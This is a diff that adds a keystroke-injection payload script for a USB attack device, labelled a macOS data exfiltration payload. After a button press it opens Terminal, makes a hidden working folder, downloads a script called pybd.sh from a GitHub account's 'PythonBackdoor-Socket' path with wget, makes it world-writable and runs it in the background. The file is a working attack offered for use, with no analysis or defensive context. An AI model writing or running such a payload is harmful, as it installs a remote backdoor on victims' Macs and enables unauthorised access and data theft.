@@ -1,0 +1,40 @@
+REM -------------------------------------------
+REM      MacOS Data Exfiltration payload
+REM
+REM Version: 0.1
+REM TargetOS: MacOS
+REM Author: David 'mArm' Ansermot
+REM -------------------------------------------
+
+ATTACKMODE HID STORAGE
+
+REM -- Initialisation delay
+DELAY 2000
+
+REM -- Payloads requires to press the button to attack
+LED_R
+WAIT_FOR_BUTTON_PRESS
+LED_OFF
+
+REM -- Open Terminal
+GUI SPACE
+DELAY 50
+STRING Terminal
+DELAY 50
+ENTER
+
+REM -- Go to correct folder
+STRINGLN mkdir /opt/a6c5d4
+STRINGLN cd /opt/a6c5d4
+
+REM -- Download python payload
+STRINGLN wget https://raw.githubusercontent.com/mArm-ch/FunnyTools/master/MacOS/PythonBackdoor-Socket/pybd.sh
+
+
+REM -- Execute script in background
+STRINGLN chmod 777 pybd.sh
+DELAY 50
+STRINGLN nohup pybd.sh &
+
+REM -- Indicate that the payload is done
+LED_G
